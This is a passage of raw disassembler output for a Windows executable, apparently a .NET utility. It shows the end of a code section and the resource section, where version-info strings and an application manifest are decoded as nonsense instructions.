  40df3e:	inc    ebp
  40df3f:	js     0x40dfa4
  40df41:	gs jo  0x40dfb8
  40df44:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40df4b:	ja     0x40dfc0
  40df4d:	add    DWORD PTR [eax],eax
  40df4f:	add    BYTE PTR [eax],al
  40df51:	add    BYTE PTR [eax],al
  40df53:	add    bh,ch
  40df55:	or     DWORD PTR [ebx+0x55],ecx
  40df58:	add    BYTE PTR [eax],al
  40df5a:	add    BYTE PTR [eax],al
  40df5c:	add    al,BYTE PTR [eax]
  40df5e:	add    BYTE PTR [eax],al
  40df60:	sub    BYTE PTR [eax],al
  40df62:	add    BYTE PTR [eax],al
  40df64:	ins    BYTE PTR es:[edi],dx
  40df65:	fild   WORD PTR [eax]
  40df67:	add    BYTE PTR [edi+ecx*8+0x0],ch
  40df6b:	add    BYTE PTR [edx+0x53],dl
  40df6e:	inc    esp
  40df6f:	push   ebx
  40df70:	es mov esi,0xeb3b948f
  40df76:	cs inc esi
  40df78:	pushf  
  40df79:	mov    esi,0x3f2d2b70
  40df7e:	xlat   BYTE PTR fs:[ebx]
  40df80:	add    DWORD PTR [eax],eax
  40df82:	add    BYTE PTR [eax],al
  40df84:	inc    esp
  40df85:	popa   
  40df86:	je     0x40dfe9
  40df88:	push   ebx
  40df89:	jbe    0x40dfee
  40df8b:	push   ebp
  40df8c:	je     0x40dff7
  40df8e:	ins    BYTE PTR es:[edi],dx
  40df8f:	cs jo  0x40dff6
  40df92:	bound  eax,QWORD PTR [eax]
	...
  40dfc0:	call   0x40e0a4
  40dfc5:	add    BYTE PTR [eax],al
  40dfc7:	add    BYTE PTR [eax],al
  40dfc9:	add    BYTE PTR [eax],al
  40dfcb:	add    dh,bh
  40dfcd:	fild   WORD PTR [eax]
  40dfcf:	add    BYTE PTR [eax],al
  40dfd1:	and    BYTE PTR [eax],al
	...
  40dfe7:	add    al,dh
  40dfe9:	fild   WORD PTR [eax]
  40dfeb:	add    BYTE PTR [eax],al
  40dfed:	add    BYTE PTR [eax],al
  40dfef:	add    BYTE PTR [eax],al
  40dff1:	add    BYTE PTR [edi+0x43],bl
  40dff4:	outs   dx,DWORD PTR ds:[esi]
  40dff5:	jb     0x40e03c
  40dff7:	js     0x40e05e
  40dff9:	dec    ebp
  40dffa:	popa   
  40dffb:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40e002:	jb     0x40e069
  40e004:	gs cs fs ins BYTE PTR es:[edi],dx
  40e008:	ins    BYTE PTR es:[edi],dx
  40e009:	add    BYTE PTR [eax],al
  40e00b:	add    BYTE PTR [eax],al
  40e00d:	add    bh,bh
  40e00f:	and    eax,0x402000

Disassembly of section .rsrc:

00410000 <.rsrc>:
	...
  41000c:	add    BYTE PTR [eax],al
  41000e:	add    al,BYTE PTR [eax]
  410010:	adc    BYTE PTR [eax],al
  410012:	add    BYTE PTR [eax],al
  410014:	and    BYTE PTR [eax],al
  410016:	add    BYTE PTR [eax+0x18],al
  41001c:	cmp    BYTE PTR [eax],al
  41001e:	add    BYTE PTR [eax+0x0],al
	...
  41002c:	add    BYTE PTR [eax],al
  41002e:	add    DWORD PTR [eax],eax
  410030:	add    DWORD PTR [eax],eax
  410032:	add    BYTE PTR [eax],al
  410034:	push   eax
  410035:	add    BYTE PTR [eax],al
  410037:	add    BYTE PTR [eax],0x0
	...
  410046:	add    DWORD PTR [eax],eax
  410048:	add    DWORD PTR [eax],eax
  41004a:	add    BYTE PTR [eax],al
  41004c:	push   0x800000
	...
  41005d:	add    BYTE PTR [ecx],al
  41005f:	add    BYTE PTR [eax],al
  410061:	add    BYTE PTR [eax],al
  410063:	add    BYTE PTR [eax+0x0],al
	...
  410075:	add    BYTE PTR [ecx],al
  410077:	add    BYTE PTR [eax],al
  410079:	add    BYTE PTR [eax],al
  41007b:	add    BYTE PTR [eax-0x60000000],dl
  410081:	add    BYTE PTR [ecx],al
  410083:	add    ah,al
  410085:	add    eax,DWORD PTR [eax]
	...
  41008f:	add    BYTE PTR [eax+0x4],ch
  410092:	add    DWORD PTR [eax],eax
  410094:	jmp    0x0:0x1
  41009b:	add    BYTE PTR [eax],al
  41009d:	add    BYTE PTR [eax],al
  41009f:	add    ah,al
  4100a1:	add    esi,DWORD PTR [eax+eax*1]
  4100a4:	add    BYTE PTR [eax],al
  4100a6:	push   esi
  4100a7:	add    BYTE PTR [ebx+0x0],dl
  4100aa:	pop    edi
  4100ab:	add    BYTE PTR [esi+0x0],dl
  4100ae:	inc    ebp
  4100af:	add    BYTE PTR [edx+0x0],dl
  4100b2:	push   ebx
  4100b3:	add    BYTE PTR [ecx+0x0],cl
  4100b6:	dec    edi
  4100b7:	add    BYTE PTR [esi+0x0],cl
  4100ba:	pop    edi
  4100bb:	add    BYTE PTR [ecx+0x0],cl
  4100be:	dec    esi
  4100bf:	add    BYTE PTR [esi+0x0],al
  4100c2:	dec    edi
  4100c3:	add    BYTE PTR [eax],al
  4100c5:	add    BYTE PTR [eax],al
  4100c7:	add    BYTE PTR [ebp+0xfeef04],bh
  4100cd:	add    BYTE PTR [ecx],al
  4100cf:	add    BYTE PTR ds:0xe2000300,al
  4100d5:	and    DWORD PTR [ecx],ecx
  4100d7:	js     0x4100de
  4100d9:	add    BYTE PTR [ebx],al
  4100db:	add    dl,ah
  4100dd:	and    DWORD PTR [ecx],ecx
  4100df:	js     0x410120
  4100e1:	add    BYTE PTR [eax],al
  4100e3:	add    BYTE PTR [eax],al
  4100e5:	add    BYTE PTR [eax],al
  4100e7:	add    BYTE PTR [eax+eax*1],al
  4100ea:	add    BYTE PTR [eax],al
  4100ec:	add    DWORD PTR [eax],eax
	...
  4100fa:	add    BYTE PTR [eax],al
  4100fc:	inc    esp
  4100fd:	add    BYTE PTR [eax],al
  4100ff:	add    BYTE PTR [ecx],al
  410101:	add    BYTE PTR [esi+0x0],dl
  410104:	popa   
  410105:	add    BYTE PTR [edx+0x0],dh
  410108:	inc    esi
  410109:	add    BYTE PTR [ecx+0x0],ch
  41010c:	ins    BYTE PTR es:[edi],dx
  41010d:	add    BYTE PTR [ebp+0x0],ah
  410110:	dec    ecx
  410111:	add    BYTE PTR [esi+0x0],ch
  410114:	data16 add BYTE PTR [edi+0x0],ch
  410118:	add    BYTE PTR [eax],al
  41011a:	add    BYTE PTR [eax],al
  41011c:	and    al,0x0
  41011e:	add    al,0x0
  410120:	add    BYTE PTR [eax],al
  410122:	push   esp
  410123:	add    BYTE PTR [edx+0x0],dh
  410126:	popa   
  410127:	add    BYTE PTR [esi+0x0],ch
  41012a:	jae    0x41012c
  41012c:	ins    BYTE PTR es:[edi],dx
  41012d:	add    BYTE PTR [ecx+0x0],ah
  410130:	je     0x410132
  410132:	imul   eax,DWORD PTR [eax],0x6e006f
  410138:	add    BYTE PTR [eax],al
  41013a:	add    BYTE PTR [eax],al
  41013c:	add    BYTE PTR [eax],al
  41013e:	mov    al,0x4
  410140:	and    al,0x3
  410142:	add    BYTE PTR [eax],al
  410144:	add    DWORD PTR [eax],eax
  410146:	push   ebx
  410147:	add    BYTE PTR [eax+eax*1+0x72],dh
  41014b:	add    BYTE PTR [ecx+0x0],ch
  41014e:	outs   dx,BYTE PTR ds:[esi]
  41014f:	add    BYTE PTR [edi+0x0],ah
  410152:	inc    esi
  410153:	add    BYTE PTR [ecx+0x0],ch
  410156:	ins    BYTE PTR es:[edi],dx
  410157:	add    BYTE PTR [ebp+0x0],ah
  41015a:	dec    ecx
  41015b:	add    BYTE PTR [esi+0x0],ch
  41015e:	data16 add BYTE PTR [edi+0x0],ch
  410162:	add    BYTE PTR [eax],al
  410164:	add    BYTE PTR [ebx],al
  410166:	add    BYTE PTR [eax],al
  410168:	add    DWORD PTR [eax],eax
  41016a:	xor    BYTE PTR [eax],al
  41016c:	xor    BYTE PTR [eax],al
  41016e:	xor    BYTE PTR [eax],al
  410170:	xor    BYTE PTR [eax],al
  410172:	xor    BYTE PTR [eax],al
  410174:	xor    al,0x0
  410176:	bound  eax,QWORD PTR [eax]
  410178:	xor    BYTE PTR [eax],al
  41017a:	add    BYTE PTR [eax],al
  41017c:	cmp    BYTE PTR [eax],al
  41017e:	adc    BYTE PTR [eax],al
  410180:	add    DWORD PTR [eax],eax
  410182:	inc    ebx
  410183:	add    BYTE PTR [edi+0x0],ch
  410186:	ins    DWORD PTR es:[edi],dx
  410187:	add    BYTE PTR [ebp+0x0],ch
  41018a:	add    BYTE PTR gs:[esi+0x0],ch
  41018e:	je     0x410190
  410190:	jae    0x410192
  410192:	add    BYTE PTR [eax],al
  410194:	inc    esp
  410195:	add    BYTE PTR [ecx+0x0],ah
  410198:	je     0x41019a
  41019a:	popa   
  41019b:	add    BYTE PTR [ebx+0x0],dl
  41019e:	jbe    0x4101a0
  4101a0:	arpl   WORD PTR [eax],ax
  4101a2:	push   ebp
  4101a3:	add    BYTE PTR [eax+eax*1+0x69],dh
  4101a7:	add    BYTE PTR [eax+eax*1+0x2e],ch
  4101ab:	add    BYTE PTR [ebp+0x0],ah
  4101ae:	js     0x4101b0
  4101b0:	add    BYTE PTR gs:[eax],al
  4101b3:	add    BYTE PTR [eax+eax*1+0x16],cl
  4101b7:	add    BYTE PTR [ecx],al
  4101b9:	add    BYTE PTR [ebx+0x0],al
  4101bc:	outs   dx,DWORD PTR ds:[esi]
  4101bd:	add    BYTE PTR [ebp+0x0],ch
  4101c0:	jo     0x4101c2
  4101c2:	popa   
  4101c3:	add    BYTE PTR [esi+0x0],ch
  4101c6:	jns    0x4101c8
  4101c8:	dec    esi
  4101c9:	add    BYTE PTR [ecx+0x0],ah
  4101cc:	ins    DWORD PTR es:[edi],dx
  4101cd:	add    BYTE PTR [ebp+0x0],ah
  4101d0:	add    BYTE PTR [eax],al
  4101d2:	add    BYTE PTR [eax],al
  4101d4:	dec    ebp
  4101d5:	add    BYTE PTR [ecx+0x0],ch
  4101d8:	arpl   WORD PTR [eax],ax
  4101da:	jb     0x4101dc
  4101dc:	outs   dx,DWORD PTR ds:[esi]
  4101dd:	add    BYTE PTR [ebx+0x0],dh
  4101e0:	outs   dx,DWORD PTR ds:[esi]
  4101e1:	add    BYTE PTR [esi+0x0],ah
  4101e4:	je     0x4101e6
  4101e6:	and    BYTE PTR [eax],al
  4101e8:	inc    ebx
  4101e9:	add    BYTE PTR [edi+0x0],ch
  4101ec:	jb     0x4101ee
  4101ee:	jo     0x4101f0
  4101f0:	outs   dx,DWORD PTR ds:[esi]
  4101f1:	add    BYTE PTR [edx+0x0],dh
  4101f4:	popa   
  4101f5:	add    BYTE PTR [eax+eax*1+0x69],dh
  4101f9:	add    BYTE PTR [edi+0x0],ch
  4101fc:	outs   dx,BYTE PTR ds:[esi]
  4101fd:	add    BYTE PTR [eax],al
  4101ff:	add    BYTE PTR [eax+0x0],cl
  410202:	adc    BYTE PTR [eax],al
  410204:	add    DWORD PTR [eax],eax
  410206:	inc    esi
  410207:	add    BYTE PTR [ecx+0x0],ch
  41020a:	ins    BYTE PTR es:[edi],dx
  41020b:	add    BYTE PTR [ebp+0x0],ah
  41020e:	inc    esp
  41020f:	add    BYTE PTR [ebp+0x0],ah
  410212:	jae    0x410214
  410214:	arpl   WORD PTR [eax],ax
  410216:	jb     0x410218
  410218:	imul   eax,DWORD PTR [eax],0x740070
  41021e:	imul   eax,DWORD PTR [eax],0x6e006f
  410224:	add    BYTE PTR [eax],al
  410226:	add    BYTE PTR [eax],al
  410228:	inc    esp
  410229:	add    BYTE PTR [ecx+0x0],ah
  41022c:	je     0x41022e
  41022e:	popa   
  41022f:	add    BYTE PTR [ebx+0x0],dl
  410232:	jbe    0x410234
  410234:	arpl   WORD PTR [eax],ax
  410236:	push   ebp
  410237:	add    BYTE PTR [eax+eax*1+0x69],dh
  41023b:	add    BYTE PTR [eax+eax*1+0x2e],ch
  41023f:	add    BYTE PTR [ebp+0x0],ah
  410242:	js     0x410244
  410244:	add    BYTE PTR gs:[eax],al
  410247:	add    BYTE PTR [eax+0x0],al
  41024a:	sldt   WORD PTR [ecx]
  41024d:	add    BYTE PTR [esi+0x0],al
  410250:	imul   eax,DWORD PTR [eax],0x65006c
  410256:	push   esi
  410257:	add    BYTE PTR [ebp+0x0],ah
  41025a:	jb     0x41025c
  41025c:	jae    0x41025e
  41025e:	imul   eax,DWORD PTR [eax],0x6e006f
  410264:	add    BYTE PTR [eax],al
  410266:	add    BYTE PTR [eax],al
  410268:	xor    eax,DWORD PTR [eax]
  41026a:	add    BYTE PTR cs:0x33002e00,dh
  410271:	add    BYTE PTR [eax],dh
  410273:	add    BYTE PTR [edi],dh
  410275:	add    BYTE PTR [edx],dh
  410277:	add    BYTE PTR [ecx],bh
  410279:	add    BYTE PTR [esi],ch
  41027b:	add    BYTE PTR [eax],bh
  41027d:	add    BYTE PTR [esi],dh
  41027f:	add    BYTE PTR [edi],dh
  410281:	add    BYTE PTR [eax+eax*1],dh
  410284:	add    BYTE PTR [eax],al
  410286:	add    BYTE PTR [eax],al
  410288:	inc    eax
  410289:	add    BYTE PTR [eax],dl
  41028b:	add    BYTE PTR [ecx],al
  41028d:	add    BYTE PTR [ecx+0x0],cl
  410290:	outs   dx,BYTE PTR ds:[esi]
  410291:	add    BYTE PTR [eax+eax*1+0x65],dh
  410295:	add    BYTE PTR [edx+0x0],dh
  410298:	outs   dx,BYTE PTR ds:[esi]
  410299:	add    BYTE PTR [ecx+0x0],ah
  41029c:	ins    BYTE PTR es:[edi],dx
  41029d:	add    BYTE PTR [esi+0x0],cl
  4102a0:	popa   
  4102a1:	add    BYTE PTR [ebp+0x0],ch
  4102a4:	add    BYTE PTR gs:[eax],al
  4102a7:	add    BYTE PTR [eax+eax*1+0x61],al
  4102ab:	add    BYTE PTR [eax+eax*1+0x61],dh
  4102af:	add    BYTE PTR [ebx+0x0],dl
  4102b2:	jbe    0x4102b4
  4102b4:	arpl   WORD PTR [eax],ax
  4102b6:	push   ebp
  4102b7:	add    BYTE PTR [eax+eax*1+0x69],dh
  4102bb:	add    BYTE PTR [eax+eax*1+0x2e],ch
  4102bf:	add    BYTE PTR [ebp+0x0],ah
  4102c2:	js     0x4102c4
  4102c4:	add    BYTE PTR gs:[eax],al
  4102c7:	add    BYTE PTR [eax+eax*1+0x1002f],al
  4102ce:	dec    esp
  4102cf:	add    BYTE PTR [ebp+0x0],ah
  4102d2:	add    BYTE PTR [bx+di+0x0],ah
  4102d6:	ins    BYTE PTR es:[edi],dx
  4102d7:	add    BYTE PTR [ebx+0x0],al
  4102da:	outs   dx,DWORD PTR ds:[esi]
  4102db:	add    BYTE PTR [eax+0x0],dh
  4102de:	jns    0x4102e0
  4102e0:	jb     0x4102e2
  4102e2:	imul   eax,DWORD PTR [eax],0x680067
  4102e8:	je     0x4102ea
  4102ea:	add    BYTE PTR [eax],al
  4102ec:	test   eax,0x4d002000
  4102f1:	add    BYTE PTR [ecx+0x0],ch
  4102f4:	arpl   WORD PTR [eax],ax
  4102f6:	jb     0x4102f8
  4102f8:	outs   dx,DWORD PTR ds:[esi]
  4102f9:	add    BYTE PTR [ebx+0x0],dh
  4102fc:	outs   dx,DWORD PTR ds:[esi]
  4102fd:	add    BYTE PTR [esi+0x0],ah
  410300:	je     0x410302
  410302:	and    BYTE PTR [eax],al
  410304:	inc    ebx
  410305:	add    BYTE PTR [edi+0x0],ch
  410308:	jb     0x41030a
  41030a:	jo     0x41030c
  41030c:	outs   dx,DWORD PTR ds:[esi]
  41030d:	add    BYTE PTR [edx+0x0],dh
  410310:	popa   
  410311:	add    BYTE PTR [eax+eax*1+0x69],dh
  410315:	add    BYTE PTR [edi+0x0],ch
  410318:	outs   dx,BYTE PTR ds:[esi]
  410319:	add    BYTE PTR [esi],ch
  41031b:	add    BYTE PTR [eax],ah
  41031d:	add    BYTE PTR [eax],ah
  41031f:	add    BYTE PTR [ecx+0x0],al
  410322:	ins    BYTE PTR es:[edi],dx
  410323:	add    BYTE PTR [eax+eax*1+0x20],ch
  410327:	add    BYTE PTR [edx+0x0],dh
  41032a:	imul   eax,DWORD PTR [eax],0x680067
  410330:	je     0x410332
  410332:	jae    0x410334
  410334:	and    BYTE PTR [eax],al
  410336:	jb     0x410338
  410338:	add    BYTE PTR gs:[ebx+0x0],dh
  41033c:	add    BYTE PTR gs:[edx+0x0],dh
  410340:	jbe    0x410342
  410342:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  410347:	add    BYTE PTR [eax],al
  410349:	add    BYTE PTR [eax],al
  41034b:	add    BYTE PTR [eax+0x0],cl
  41034e:	adc    BYTE PTR [eax],al
  410350:	add    DWORD PTR [eax],eax
  410352:	dec    edi
  410353:	add    BYTE PTR [edx+0x0],dh
  410356:	imul   eax,DWORD PTR [eax],0x690067
  41035c:	outs   dx,BYTE PTR ds:[esi]
  41035d:	add    BYTE PTR [ecx+0x0],ah
  410360:	ins    BYTE PTR es:[edi],dx
  410361:	add    BYTE PTR [esi+0x0],al
  410364:	imul   eax,DWORD PTR [eax],0x65006c
  41036a:	outs   dx,BYTE PTR ds:[esi]
  41036b:	add    BYTE PTR [ecx+0x0],ah
  41036e:	ins    DWORD PTR es:[edi],dx
  41036f:	add    BYTE PTR [ebp+0x0],ah
  410372:	add    BYTE PTR [eax],al
  410374:	inc    esp
  410375:	add    BYTE PTR [ecx+0x0],ah
  410378:	je     0x41037a
  41037a:	popa   
  41037b:	add    BYTE PTR [ebx+0x0],dl
  41037e:	jbe    0x410380
  410380:	arpl   WORD PTR [eax],ax
  410382:	push   ebp
  410383:	add    BYTE PTR [eax+eax*1+0x69],dh
  410387:	add    BYTE PTR [eax+eax*1+0x2e],ch
  41038b:	add    BYTE PTR [ebp+0x0],ah
  41038e:	js     0x410390
  410390:	add    BYTE PTR gs:[eax],al
  410393:	add    BYTE PTR [eax+eax*1+0x1a],dl
  410397:	add    BYTE PTR [ecx],al
  410399:	add    BYTE PTR [eax+0x0],dl
  41039c:	jb     0x41039e
  41039e:	outs   dx,DWORD PTR ds:[esi]
  41039f:	add    BYTE PTR [eax+eax*1+0x75],ah
  4103a3:	add    BYTE PTR [ebx+0x0],ah
  4103a6:	je     0x4103a8
  4103a8:	dec    esi
  4103a9:	add    BYTE PTR [ecx+0x0],ah
  4103ac:	ins    DWORD PTR es:[edi],dx
  4103ad:	add    BYTE PTR [ebp+0x0],ah
  4103b0:	add    BYTE PTR [eax],al
  4103b2:	add    BYTE PTR [eax],al
  4103b4:	dec    ebp
  4103b5:	add    BYTE PTR [ecx+0x0],ch
  4103b8:	arpl   WORD PTR [eax],ax
  4103ba:	jb     0x4103bc
  4103bc:	outs   dx,DWORD PTR ds:[esi]
  4103bd:	add    BYTE PTR [ebx+0x0],dh
  4103c0:	outs   dx,DWORD PTR ds:[esi]
  4103c1:	add    BYTE PTR [esi+0x0],ah
  4103c4:	je     0x4103c6
  4103c6:	scas   al,BYTE PTR es:[edi]
  4103c7:	add    BYTE PTR [eax],ah
  4103c9:	add    BYTE PTR [esi],ch
  4103cb:	add    BYTE PTR [esi+0x0],cl
  4103ce:	inc    ebp
  4103cf:	add    BYTE PTR [eax+eax*1+0x20],dl
  4103d3:	add    BYTE PTR [esi+0x0],al
  4103d6:	jb     0x4103d8
  4103d8:	popa   
  4103d9:	add    BYTE PTR [ebp+0x0],ch
  4103dc:	add    BYTE PTR gs:[edi+0x0],dh
  4103e0:	outs   dx,DWORD PTR ds:[esi]
  4103e1:	add    BYTE PTR [edx+0x0],dh
  4103e4:	imul   eax,DWORD PTR [eax],0x0
  4103e7:	add    BYTE PTR [eax+eax*1+0xf],al
  4103eb:	add    BYTE PTR [ecx],al
  4103ed:	add    BYTE PTR [eax+0x0],dl
  4103f0:	jb     0x4103f2
  4103f2:	outs   dx,DWORD PTR ds:[esi]
  4103f3:	add    BYTE PTR [eax+eax*1+0x75],ah
  4103f7:	add    BYTE PTR [ebx+0x0],ah
  4103fa:	je     0x4103fc
  4103fc:	push   esi
  4103fd:	add    BYTE PTR [ebp+0x0],ah
  410400:	jb     0x410402
  410402:	jae    0x410404
  410404:	imul   eax,DWORD PTR [eax],0x6e006f
  41040a:	add    BYTE PTR [eax],al
  41040c:	xor    eax,DWORD PTR [eax]
  41040e:	add    BYTE PTR cs:0x33002e00,dh
  410415:	add    BYTE PTR [eax],dh
  410417:	add    BYTE PTR [edi],dh
  410419:	add    BYTE PTR [edx],dh
  41041b:	add    BYTE PTR [ecx],bh
  41041d:	add    BYTE PTR [esi],ch
  41041f:	add    BYTE PTR [eax],bh
  410421:	add    BYTE PTR [esi],dh
  410423:	add    BYTE PTR [edi],dh
  410425:	add    BYTE PTR [eax+eax*1],dh
  410428:	add    BYTE PTR [eax],al
  41042a:	add    BYTE PTR [eax],al
  41042c:	cmp    BYTE PTR [eax],al
  41042e:	or     BYTE PTR [eax],al
  410430:	add    DWORD PTR [eax],eax
  410432:	inc    ecx
  410433:	add    BYTE PTR [ebx+0x0],dh
  410436:	jae    0x410438
  410438:	add    BYTE PTR gs:[ebp+0x0],ch
  41043c:	bound  eax,QWORD PTR [eax]
  41043e:	ins    BYTE PTR es:[edi],dx
  41043f:	add    BYTE PTR [ecx+0x0],bh
  410442:	and    BYTE PTR [eax],al
  410444:	push   esi
  410445:	add    BYTE PTR [ebp+0x0],ah
  410448:	jb     0x41044a
  41044a:	jae    0x41044c
  41044c:	imul   eax,DWORD PTR [eax],0x6e006f
  410452:	add    BYTE PTR [eax],al
  410454:	xor    eax,DWORD PTR [eax]
  410456:	add    BYTE PTR cs:0x30002e00,dh
  41045d:	add    BYTE PTR [esi],ch
  41045f:	add    BYTE PTR [eax],dh
  410461:	add    BYTE PTR [eax],al
  410463:	add    BYTE PTR [eax],al
  410465:	add    BYTE PTR [eax],al
  410467:	add    bh,ch
  410469:	mov    ebx,0x783f3cbf
  41046e:	ins    DWORD PTR es:[edi],dx
  41046f:	ins    BYTE PTR es:[edi],dx
  410470:	and    BYTE PTR [esi+0x65],dh
  410473:	jb     0x4104e8
  410475:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  41047c:	xor    BYTE PTR [edx],ah
  41047e:	and    BYTE PTR [ebp+0x6e],ah
  410481:	arpl   WORD PTR [edi+0x64],bp
  410484:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  41048b:	inc    esi
  41048c:	sub    eax,0x73202238
  410491:	je     0x4104f4
  410493:	outs   dx,BYTE PTR ds:[esi]
  410494:	fs popa 
  410496:	ins    BYTE PTR es:[edi],dx
  410497:	outs   dx,DWORD PTR ds:[esi]
  410498:	outs   dx,BYTE PTR ds:[esi]
  410499:	gs cmp eax,0x73657922
  41049f:	and    bh,BYTE PTR [edi]
  4104a1:	ds or  eax,0x73613c0a
  4104a7:	jae    0x41050e
  4104a9:	ins    DWORD PTR es:[edi],dx
  4104aa:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4104ae:	js     0x41051d
  4104b0:	ins    BYTE PTR es:[edi],dx
  4104b1:	outs   dx,BYTE PTR ds:[esi]
  4104b2:	jae    0x4104f1
  4104b4:	and    dh,BYTE PTR [ebp+0x72]
  4104b7:	outs   dx,BYTE PTR ds:[esi]
  4104b8:	cmp    dh,BYTE PTR [ebx+0x63]
  4104bb:	push   0x73616d65
  4104c0:	sub    eax,0x7263696d
  4104c5:	outs   dx,DWORD PTR ds:[esi]
  4104c6:	jae    0x410537
  4104c8:	data16 je 0x4104f8
  4104cb:	arpl   WORD PTR [edi+0x6d],bp
  4104ce:	cmp    ah,BYTE PTR [ecx+0x73]
  4104d1:	ins    DWORD PTR es:[edi],dx
  4104d2:	cs jbe 0x410506
  4104d5:	and    ah,BYTE PTR [eax]
  4104d7:	ins    DWORD PTR es:[edi],dx
  4104d8:	popa   
  4104d9:	outs   dx,BYTE PTR ds:[esi]
  4104da:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  4104e1:	jb     0x410556
  4104e3:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4104ea:	xor    BYTE PTR [edx],ah
  4104ec:	ds or  eax,0x3c20200a
  4104f2:	popa   
  4104f3:	jae    0x410568
  4104f5:	gs ins DWORD PTR es:[edi],dx
  4104f7:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4104fb:	fs outs dx,BYTE PTR gs:[esi]
  4104fe:	je     0x410569
  410500:	je     0x41057b
  410502:	and    BYTE PTR [esi+0x65],dh
  410505:	jb     0x41057a
  410507:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  41050e:	xor    BYTE PTR [esi],ch
  410510:	xor    BYTE PTR [esi],ch
  410512:	xor    BYTE PTR [edx],ah
  410514:	and    BYTE PTR [esi+0x61],ch
  410517:	ins    DWORD PTR es:[edi],dx
  410518:	gs cmp eax,0x41794d22
  41051e:	jo     0x410590
  410520:	ins    BYTE PTR es:[edi],dx
  410521:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  410528:	cs popa 
  41052a:	jo     0x41059c
  41052c:	and    ch,BYTE PTR [edi]
  41052e:	ds or  eax,0x3c20200a
  410534:	je     0x4105a8
  410536:	jne    0x4105ab
  410538:	je     0x410583
  41053a:	outs   dx,BYTE PTR ds:[esi]
  41053b:	outs   dx,WORD PTR ds:[esi]
  41053d:	and    BYTE PTR [eax+0x6d],bh
  410540:	ins    BYTE PTR es:[edi],dx
  410541:	outs   dx,BYTE PTR ds:[esi]
  410542:	jae    0x410581
  410544:	and    dh,BYTE PTR [ebp+0x72]
  410547:	outs   dx,BYTE PTR ds:[esi]
  410548:	cmp    dh,BYTE PTR [ebx+0x63]
  41054b:	push   0x73616d65
  410550:	sub    eax,0x7263696d
  410555:	outs   dx,DWORD PTR ds:[esi]
  410556:	jae    0x4105c7
  410558:	data16 je 0x410588
  41055b:	arpl   WORD PTR [edi+0x6d],bp
  41055e:	cmp    ah,BYTE PTR [ecx+0x73]
  410561:	ins    DWORD PTR es:[edi],dx
  410562:	cs jbe 0x410597
  410565:	and    bh,BYTE PTR [esi]
  410567:	or     eax,0x2020200a
  41056c:	and    BYTE PTR [ebx+esi*2],bh
  41056f:	arpl   WORD PTR gs:[ebp+0x72],si
  410573:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  41057b:	and    BYTE PTR [eax],ah
  41057d:	and    BYTE PTR [eax],ah
  41057f:	cmp    al,0x72
  410581:	gs jno 0x4105f9
  410584:	gs jae 0x4105fb
  410587:	gs fs push eax
  41058a:	jb     0x4105f5
  41058c:	jbe    0x4105f7
  41058e:	ins    BYTE PTR es:[edi],dx
  41058f:	gs addr16 gs jae 0x4105b4
  410594:	js     0x410603
  410596:	ins    BYTE PTR es:[edi],dx
  410597:	outs   dx,BYTE PTR ds:[esi]
  410598:	jae    0x4105d7
  41059a:	and    dh,BYTE PTR [ebp+0x72]
  41059d:	outs   dx,BYTE PTR ds:[esi]
  41059e:	cmp    dh,BYTE PTR [ebx+0x63]
  4105a1:	push   0x73616d65
  4105a6:	sub    eax,0x7263696d
  4105ab:	outs   dx,DWORD PTR ds:[esi]
  4105ac:	jae    0x41061d
  4105ae:	data16 je 0x4105de
  4105b1:	arpl   WORD PTR [edi+0x6d],bp
  4105b4:	cmp    ah,BYTE PTR [ecx+0x73]
  4105b7:	ins    DWORD PTR es:[edi],dx
  4105b8:	cs jbe 0x4105ee
  4105bb:	and    bh,BYTE PTR [esi]
  4105bd:	or     eax,0x2020200a
  4105c2:	and    BYTE PTR [eax],ah
  4105c4:	and    BYTE PTR [eax],ah
  4105c6:	and    BYTE PTR [edx+esi*2],bh
  4105c9:	gs jno 0x410641
  4105cc:	gs jae 0x410643
  4105cf:	gs fs inc ebp
  4105d2:	js     0x410639
  4105d4:	arpl   WORD PTR [ebp+0x74],si
  4105d7:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4105de:	ins    BYTE PTR es:[edi],dx
  4105df:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4105e3:	gs ins BYTE PTR es:[edi],dx
  4105e5:	cmp    eax,0x49736122
  4105ea:	outs   dx,BYTE PTR ds:[esi]
  4105eb:	jbe    0x41065c
  4105ed:	imul   esp,DWORD PTR [ebp+0x72],0x22
  4105f1:	and    BYTE PTR [ebp+0x69],dh
  4105f4:	inc    ecx
  4105f5:	arpl   WORD PTR [ebx+0x65],sp
  4105f8:	jae    0x41066d
  4105fa:	cmp    eax,0x6c616622
  4105ff:	jae    0x410666
  410601:	and    ch,BYTE PTR [edi]
  410603:	ds or  eax,0x2020200a
  410609:	and    BYTE PTR [eax],ah
  41060b:	and    BYTE PTR [edi+ebp*1],bh
  41060e:	jb     0x410675
  410610:	jno    0x410687
  410612:	gs jae 0x410689
  410615:	gs fs push eax
  410618:	jb     0x410683
  41061a:	jbe    0x410685
  41061c:	ins    BYTE PTR es:[edi],dx
  41061d:	gs addr16 gs jae 0x410660
  410622:	or     eax,0x2020200a
  410627:	and    BYTE PTR [edi+ebp*1],bh
  41062a:	jae    0x410691
  41062c:	arpl   WORD PTR [ebp+0x72],si
  41062f:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  410637:	cmp    al,0x2f
  410639:	je     0x4106ad
  41063b:	jne    0x4106b0
  41063d:	je     0x410688
  41063f:	outs   dx,BYTE PTR ds:[esi]
  410640:	outs   dx,WORD PTR ds:[esi]
  410642:	ds or  eax,0x612f3c0a
  410648:	jae    0x4106bd
  41064a:	gs ins DWORD PTR es:[edi],dx
  41064c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  410650:	or     eax,0xa
  410655:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00412000 <.reloc>:
  412000:	add    al,ah
  412002:	add    BYTE PTR [eax],al
  412004:	or     al,0x0
